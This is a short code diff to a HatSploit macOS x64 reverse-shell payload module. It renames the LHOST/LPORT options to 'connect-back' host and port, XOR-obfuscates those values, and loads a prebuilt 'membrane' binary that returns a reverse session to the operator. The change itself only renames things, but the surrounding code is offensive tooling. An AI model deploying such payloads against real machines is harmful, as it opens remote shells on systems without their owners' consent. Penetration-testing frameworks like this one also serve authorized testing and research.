@@ -59,14 +59,14 @@ class HatSploitPayload(Payload, StringTools):
     }
 
     options = {
-        'LHOST': {
-            'Description': "Local host.",
+        'CBHOST': {
+            'Description': "Connect-back host.",
             'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
-        'LPORT': {
-            'Description': "Local port.",
+        'CBPORT': {
+            'Description': "Connect-back port.",
             'Value': 8888,
             'Type': "port",
             'Required': True
@@ -74,12 +74,12 @@ class HatSploitPayload(Payload, StringTools):
     }
 
     def run(self):
-        local_host, local_port = self.parse_options(self.options)
+        connback_host, connback_port = self.parse_options(self.options)
 
-        local_host = self.xor_string(local_host)
-        local_port = self.xor_string(local_port)
+        connback_host = self.xor_string(connback_host)
+        connback_port = self.xor_string(connback_port)
 
         with open(f"{self.config.path_config['data_path']}membrane/macos/x64/membrane", 'rb') as f:
             payload = f.read()
 
-        return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
+        return payload, f"reverse '{connback_host}' '{connback_port}'", HatSploitSession
